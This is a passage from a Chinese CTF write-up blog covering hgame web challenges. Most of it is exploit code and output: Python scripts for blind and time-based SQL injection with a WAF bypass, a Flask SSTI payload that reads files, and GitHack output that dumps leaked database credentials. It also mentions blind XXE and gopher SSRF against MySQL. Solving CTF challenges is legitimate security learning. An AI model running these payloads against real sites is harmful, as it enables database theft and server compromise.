table_schema=database()),&#123;num&#125;,1))=&#123;each&#125;)%23&quot;.format(num=num,each=each)</span></span><br><span class="line">        <span class="comment">#id_1= &quot;1&#x27; and (ascii(mid((select group_concat(column_name) from information_schema.columns where table_name=\&quot;w3_fllllllll4ag\&quot;),&#123;num&#125;,1))=&#123;each&#125;)%23&quot;.format(num=num,each=each)</span></span><br><span class="line">        id_1= <span class="string">&quot;1&#x27; and (ascii(mid((select f111144g_w3_sqli1 from w3_fllllllll4ag limit 0,1),&#123;num&#125;,1))=&#123;each&#125;)%23&quot;</span>.<span class="built_in">format</span>(num=num,each=each)</span><br><span class="line">        code = re.findall(<span class="string">r&#x27;:=&quot;(.&#123;4&#125;)&quot;&#x27;</span>,r.text)[<span class="number">0</span>]</span><br><span class="line">        code = find_md5(code)</span><br><span class="line">        r=u.get(<span class="string">&#x27;http://118.25.18.223:10086/?id=&#x27;</span>+<span class="built_in">str</span>(id_1)+<span class="string">&quot;&amp;code=&quot;</span>+<span class="built_in">str</span>(code))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;query ok&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(each),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> each==<span class="number">128</span>:</span><br><span class="line">            ok=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ok==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>表:users,w3_fllllllll4ag 列:dajiangyoude,haishijiangyou,f111144g_w3_sqli1 flag:hgame{sql\_Injection\_s000oo\_fun}</p><h3 id="正常的sqli">正常的SQLi</h3><p>.bak文件泄漏,源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$re</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$rs</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$re</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// echo $rs[&#x27;flag&#x27;];</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$username</span> . <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;因为出题人太懒了，所以现在没有任何功能&quot;</span>;</span><br><span class="line"></span><br><span class="line">.....</span><br></pre></td></tr></table></figure><p>当天做的时候似乎题目是出了点问题...反正一直出错来着... 不过第二天好了... 语句只是执行,所以sleep注一下 给个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">129</span>):</span><br><span class="line">        ok=<span class="number">0</span></span><br><span class="line">        <span class="comment">#data=&#x27;&#x27;&#x27;99\&#x27; or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;num&#125;,1))=&#123;ascii1&#125;,sleep(5),1)#&#x27;&#x27;&#x27;.format(num=num,ascii1=each)</span></span><br><span class="line">        <span class="comment">#data=&#x27;&#x27;&#x27;99\&#x27; or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;user&quot;),&#123;num&#125;,1))=&#123;ascii1&#125;,sleep(5),1)#&#x27;&#x27;&#x27;.format(num=num,ascii1=each)</span></span><br><span class="line">        data=<span class="string">&#x27;&#x27;&#x27;99\&#x27; or if(ascii(substr((select flag from user limit 0,1),&#123;num&#125;,1))=&#123;ascii1&#125;,sleep(5),1)#&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(num=num,ascii1=each)</span><br><span class="line"></span><br><span class="line">        headers = &#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;name=&quot;</span>+base64.b64encode(data.encode()).decode()&#125;                    </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r=requests.get(<span class="string">&#x27;http://123.206.203.108:10010/normalSQLi/index.php&#x27;</span>,headers=headers,timeout=<span class="number">5</span>)</span><br><span class="line">            <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(each),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> each==<span class="number">128</span>:</span><br><span class="line">            ok=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> ok==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>表:user 列:id,flag,username 然后注意最后提取flag的时候limit一下,在limit 2,1的时候找到flag flag:hgame{fLag\_1s\_h4re.....}</p><h3 id="书店">**书店</h3><p>hint:外部实体 一发blind xxe 详情见前一篇moctf的题解最后一题 hgame{Xxe\_v3ry\_funny!!!!}</p><h3 id="ngcs-blog">ngc's blog</h3><p>一开始没啥思路,然后信息收集一下 发现是flask,猜想sstl,然后试了一下 访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.230.105.104:5000/aaaaaaaaa&#123;&#123;7+7&#125;&#125;</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.230.105.104:5000/aaaaaaaaa14</span><br></pre></td></tr></table></figure><p>即猜想正确 直接去搞flag就ok,推荐文章<a href="https://www.cnblogs.com/tyomcat/p/5440488.html">https://www.cnblogs.com/tyomcat/p/5440488.html</a> 直接访问:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.230.105.104:5000/aaaaaaaaa&#123;&#123; &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;flag&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure><p>拿到flag:hgame{skdvhdsbvadvnjVADBVS}</p><h3 id="又双叒叕是sqli">又双叒叕是SQLI</h3><p>index.php~泄漏拿到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;sql.php&quot;</span>);</span><br><span class="line">    <span class="variable">$waf</span>=<span class="string">&quot;/(sleepbenchmarkuniongroup by=&gt;&lt;hex lowerstrcmpupdatexmlxmlelementextractvalueconcatbinsleepmid\(substrleftascii\/\*\*\/)/i&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$waf</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>])!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$user</span>=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$user</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;\&#x27;&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//echo $user.&quot;&lt;br&gt;&quot;;</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$sqli</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$host</span>,<span class="variable">$username</span>,<span class="variable">$passwd</span>,<span class="variable">$database</span>);</span><br><span class="line">        <span class="variable">$sqli</span>-&gt;<span class="title function_ invoke__">set_charset</span>(<span class="string">&quot;gbk&quot;</span>);</span><br><span class="line">        <span class="variable">$query</span>=<span class="string">&quot;select * from users where username=&#x27;&quot;</span>.<span class="variable">$user</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$sqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query</span>);</span><br><span class="line">        <span class="comment">//echo $sqli-&gt;error;</span></span><br><span class="line">        <span class="variable">$num</span>=<span class="number">0</span>;</span><br><span class="line">        @<span class="variable">$num</span> = <span class="variable">$result</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$num</span>&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_row</span>())&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="number">0</span>].<span class="string">&quot;    &quot;</span>.<span class="variable">$row</span>[<span class="number">1</span>].<span class="string">&quot;   &quot;</span>.<span class="variable">$row</span>[<span class="number">2</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br></pre></td></tr></table></figure><p>看了一下,like没过滤,放个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = []</span><br><span class="line">res = []</span><br><span class="line">ok=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">129</span>):</span><br><span class="line">        <span class="comment">#payload = &quot;lalalala%df&#x27;or(select(table_name)from(information_schema.tables)where(table_schema%0alike%0adatabase())limit%0a0,1)like\&quot;&quot;</span></span><br><span class="line">        <span class="comment">#payload = &quot;lalalala%df&#x27;or(select(column_name)from(information_schema.columns)where(table_name%0alike\&quot;flllllag\&quot;)limit%0a1,1)like\&quot;&quot;</span></span><br><span class="line">        payload = <span class="string">&quot;lalalala%df&#x27;or(select%0athisisflag%0afrom(flllllag)limit%0a0,1)like%0a0x&quot;</span></span><br><span class="line">        payload = <span class="built_in">list</span>(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">chr</span>(each)!=<span class="string">&#x27;%&#x27;</span> <span class="keyword">and</span> <span class="built_in">chr</span>(each)!=<span class="string">&quot;_&quot;</span>:</span><br><span class="line">            res.append(<span class="built_in">str</span>(<span class="built_in">hex</span>(each))[<span class="number">2</span>:])</span><br><span class="line">            payload.append(<span class="string">&#x27;&#x27;</span>.join(res))</span><br><span class="line">            payload.append(<span class="string">&#x27;25%23&#x27;</span>)</span><br><span class="line">            r=requests.get(<span class="string">&#x27;http://118.25.18.223:10088/?user=&#x27;</span>+<span class="string">&#x27;&#x27;</span>.join(payload))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;guest&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(res))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res.pop()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res.append(<span class="string">&quot;5c&quot;</span>)</span><br><span class="line">            res.append(<span class="built_in">str</span>(<span class="built_in">hex</span>(each))[<span class="number">2</span>:])</span><br><span class="line">            payload.append(<span class="string">&#x27;&#x27;</span>.join(res))</span><br><span class="line">            payload.append(<span class="string">&#x27;25%23&#x27;</span>)</span><br><span class="line">            r=requests.get(<span class="string">&#x27;http://118.25.18.223:10088/?user=&#x27;</span>+<span class="string">&#x27;&#x27;</span>.join(payload))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;guest&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(res))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res.pop()</span><br><span class="line">                res.pop()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> each==<span class="number">128</span>:</span><br><span class="line">            ok=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ok==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>拿到flag hgame{like!injection!so!g00d##}</p><h3 id="散落的flag">散落的flag</h3><p>考的前端,做出来了都还没发现... 看个js,发现</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">get_userinfo</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> user = $(<span class="string">&quot;#user&quot;</span>).<span class="title function_">text</span>();</span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123; </span><br><span class="line">        <span class="attr">url</span>: <span class="string">&quot;check_user.php&quot;</span>,   </span><br><span class="line">        <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>, </span><br><span class="line">        <span class="attr">data</span>:&#123;<span class="attr">username</span>:user&#125;, </span><br><span class="line">        <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>, </span><br><span class="line">        <span class="attr">error</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;   </span><br><span class="line">            $(<span class="string">&quot;#username&quot;</span>).<span class="title function_">html</span>(<span class="string">&#x27;Error loading XML document&#x27;</span>);   </span><br><span class="line">        &#125;,   </span><br><span class="line">        <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">data,status</span>)&#123;</span><br><span class="line">           $(<span class="string">&quot;#username&quot;</span>).<span class="title function_">html</span>(<span class="string">&quot;username: &quot;</span>+data[<span class="number">0</span>]);</span><br><span class="line">           $(<span class="string">&quot;#secret&quot;</span>).<span class="title function_">html</span>(<span class="string">&quot;secret: &quot;</span>+data[<span class="number">1</span>]);</span><br><span class="line">        &#125; </span><br><span class="line">   &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="title function_">get_userinfo</span>());</span><br></pre></td></tr></table></figure><p>然后去ff的hackbar发包, 发个admin拿到10c546b2cf68 发个admin1拿到hgame{0102940de1 注册然后找回密码拿到98924acfce} 合并一下 hgame{0102940de110c546b2cf6898924acfce} 话说我做的时候有人把密码改成了123456,我直接就拿到了最后一个flag,就感觉很ez...</p><h3 id="奇怪的sqli">奇怪的SQLi</h3><p>环境差不多配好了:http://119.28.22.85:12345 但是gopher似乎连不上sql..也可能是我配置的问题 首先.git泄漏,githack一发,之前那个脚本不行..搞不到log,推荐一个脚本 <a href="https://github.com/BugScanTeam/GitHack" title="https://github.com/BugScanTeam/GitHack">https://github.com/BugScanTeam/GitHack</a> 然后拿到之后log一下,然后reset一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">root@VM-89-127-ubuntu:/home/ubuntu/GitHack# python GitHack.py http://119.28.22.85:12345/.git</span><br><span class="line"></span><br><span class="line">  ____ _ _   _   _            _</span><br><span class="line"> / ___(_) _    __ _  ___  __</span><br><span class="line">   _  __ _ / _` / __ / /</span><br><span class="line"> _   _  _   (_  (__   &lt;</span><br><span class="line"> \_____\___ _\__,_\____\_\&#123;0.0.5&#125;</span><br><span class="line"> A &#x27;.git&#x27; folder disclosure exploit.</span><br><span class="line"></span><br><span class="line">[*] Check Depends</span><br><span class="line">[+] Check depends end</span><br><span class="line">[*] Set Paths</span><br><span class="line">[*] Target Url: http://119.28.22.85:12345/.git/</span><br><span class="line">[*] Initialize Target</span><br><span class="line">[*] Try to Clone straightly</span><br><span class="line">[*] Clone</span><br><span class="line">Cloning into &#x27;/home/ubuntu/GitHack/dist/119.28.22.85_12345&#x27;...</span><br><span class="line">fatal: repository &#x27;http://119.28.22.85:12345/.git/&#x27; not found</span><br><span class="line">[-] Clone Error</span><br><span class="line">[*] Try to Clone with Directory Listing</span><br><span class="line">[*] http://119.28.22.85:12345/.git/ is not support Directory Listing</span><br><span class="line">[-] [Skip][First Try] Target is not support Directory Listing</span><br><span class="line">[*] Try to clone with Cache</span><br><span class="line">[*] Initialize Git</span><br><span class="line">[*] Cache files</span><br><span class="line">[*] packed-refs</span><br><span class="line">[*] config</span><br><span class="line">[*] HEAD</span><br><span class="line">[*] COMMIT_EDITMSG</span><br><span class="line">[*] FETCH_HEAD</span><br><span class="line">[*] /refs/heads/master</span><br><span class="line">[*] index</span><br><span class="line">[*] logs/HEAD</span><br><span class="line">[*] refs/heads/master</span><br><span class="line">[*] logs/refs/heads/master</span><br><span class="line">[*] Fetch Commit Objects</span><br><span class="line">[*] objects/e6/f0a50eaedaa25a44083a3f832a264cea3ba13a</span><br><span class="line">[*] objects/e2/f3ab9cf26f6534d9f04cb4bbbfc7770f3486ee</span><br><span class="line">[*] objects/32/2224a7f61c9d11c62fefa321ff506a24fa2d10</span><br><span class="line">[*] objects/dd/45ee5b5130bde3febd21ccb823d1a9cb341fb5</span><br><span class="line">[*] objects/98/acd10c8f8a476b279e391a4994fd1413a00800</span><br><span class="line">[*] objects/60/019e79f3d3f4d72da7bfcbafcb44cda0da8a84</span><br><span class="line">[*] objects/0d/abdd663cc60676956c8090d0f48e63b4456c03</span><br><span class="line">[*] objects/21/1fcb8891233bebe0aa087642123c3b43e8d3b0</span><br><span class="line">[*] objects/da/51001a93a4c74f4159b562449328ce16b90fe3</span><br><span class="line">[*] objects/97/43c8a21fe4e953da555ac0f14d4ca4a1bd4302</span><br><span class="line">[*] objects/db/c5e076915b5c190cc5922d15f705b6f5a4c13a</span><br><span class="line">[*] objects/a9/a17e440192ca8ff4c69e52bbecadba78ef4140</span><br><span class="line">[*] objects/89/a72a47dd1e777db9c845cf31a569c9df791134</span><br><span class="line">[*] Fetch Commit Objects End</span><br><span class="line">[*] refs/stash</span><br><span class="line">[*] Valid Repository</span><br><span class="line">[+] Valid Repository Success</span><br><span class="line"></span><br><span class="line">[+] Clone Success. Dist File : /home/ubuntu/GitHack/dist/119.28.22.85_12345</span><br><span class="line">root@VM-89-127-ubuntu:/home/ubuntu/GitHack# ls</span><br><span class="line">data  dist  GitHack.py  lib  LICENSE  README.md</span><br><span class="line">root@VM-89-127-ubuntu:/home/ubuntu/GitHack# cd dist</span><br><span class="line">root@VM-89-127-ubuntu:/home/ubuntu/GitHack/dist# ls</span><br><span class="line">119.28.22.85_12345</span><br><span class="line">root@VM-89-127-ubuntu:/home/ubuntu/GitHack/dist# cd 119.28.22.85_12345</span><br><span class="line">root@VM-89-127-ubuntu:/home/ubuntu/GitHack/dist/119.28.22.85_12345# ls</span><br><span class="line">css  index.html  index.php  login.html  login.php  register.html  register.php</span><br><span class="line">root@VM-89-127-ubuntu:/home/ubuntu/GitHack/dist/119.28.22.85_12345# git log</span><br><span class="line">commit e6f0a50eaedaa25a44083a3f832a264cea3ba13a</span><br><span class="line">Author: blacsheep &lt;784522717@qq.com&gt;</span><br><span class="line">Date:   Thu Mar 8 15:16:38 2018 +0000</span><br><span class="line"></span><br><span class="line">    remove config</span><br><span class="line"></span><br><span class="line">commit 322224a7f61c9d11c62fefa321ff506a24fa2d10</span><br><span class="line">Author: blacsheep &lt;784522717@qq.com&gt;</span><br><span class="line">Date:   Thu Mar 8 15:15:17 2018 +0000</span><br><span class="line"></span><br><span class="line">    add php</span><br><span class="line">root@VM-89-127-ubuntu:/home/ubuntu/GitHack/dist/119.28.22.85_12345# git reset --hard 322224a7f61c9d11c62fefa321ff506a24fa2d10</span><br><span class="line">HEAD is now at 322224a add php</span><br><span class="line">root@VM-89-127-ubuntu:/home/ubuntu/GitHack/dist/119.28.22.85_12345# ls</span><br><span class="line">config.php  css  index.html  index.php  login.html  login.php  register.html  register.php</span><br><span class="line">root@VM-89-127-ubuntu:/home/ubuntu/GitHack/dist/119.28.22.85_12345# cat config.php</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$db_host = &#x27;localhost&#x27;;</span><br><span class="line">$db_name = &#x27;week4&#x27;;</span><br><span class="line">$db_user = &#x27;blacsheep&#x27;;</span><br><span class="line">$db_pwd = &#x27;cnss&#x27;;</span><br><span class="line">$conn = mysqli_connect($db_host, $db_user, $db_pwd, $db_name);</span><br><span class="line">if(!$conn)&#123;</span><br><span class="line">    die(mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">root@VM-89-127-ubuntu:/home/ubuntu/GitHack/dist/119.28.22.85_12345# </span><br></pre></td></tr></table></figure><p>然后拿到mysql的帐号密码,然后有个ssrf,gopher打mysql 推荐文章:http://www.freebuf.com/articles/web/159342.html exp:https://github.com/undefinedd/extract0r- 跑一下拿到flag,本地环境等有时间我再去弄一下吧..</p>]]></content>
      
      
      <categories>
          
          <category> web篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>moctf学习</title>
      <link href="/2018/02/22/moctf%E5%AD%A6%E4%B9%A0/"/>
      <url>/2018/02/22/moctf%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>比赛的最后一个小时才知道.看大神的博客学习一下. 大神博客<a href="http://skysec.top/" title="http://skysec.top/">http://skysec.top/</a>.</p><h3 id="是时候让你手指锻炼一下了">是时候让你手指锻炼一下了</h3><p>看一下源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">   <span class="keyword">var</span> clicks=<span class="number">0</span></span><br><span class="line">   $(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">     $(<span class="string">&quot;#cookie&quot;</span>)</span><br><span class="line">       .<span class="title function_">mousedown</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">         $(<span class="variable language_">this</span>).<span class="title function_">width</span>(<span class="string">&#x27;350px&#x27;</span>).<span class="title function_">height</span>(<span class="string">&#x27;350px&#x27;</span>);</span><br><span class="line">       &#125;)</span><br><span class="line">       .<span class="title function_">mouseup</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">         $(<span class="variable language_">this</span>).<span class="title function_">width</span>(<span class="string">&#x27;375px&#x27;</span>).<span class="title function_">height</span>(<span class="string">&#x27;375px&#x27;</span>);</span><br><span class="line">         clicks++;</span><br><span class="line">         $(<span class="string">&quot;#clickcount&quot;</span>).<span class="title function_">text</span>(clicks);</span><br><span class="line">         <span class="keyword">if</span>(clicks &gt;= <span class="number">108000</span>)&#123;</span><br><span class="line">           <span class="keyword">var</span> form = $(<span class="string">&#x27;&lt;form action=&quot;&quot; method=&quot;get&quot;&gt;&#x27;</span> +</span><br><span class="line">                       <span class="string">&#x27;&lt;input type=&quot;text&quot; name=&quot;clicks&quot; value=&quot;&#x27;</span> + clicks + <span class="string">&#x27;&quot; hidden/&gt;&#x27;</span> +</span><br><span class="line">                       <span class="string">&#x27;&lt;/form&gt;&#x27;</span>);</span><br><span class="line">                       $(<span 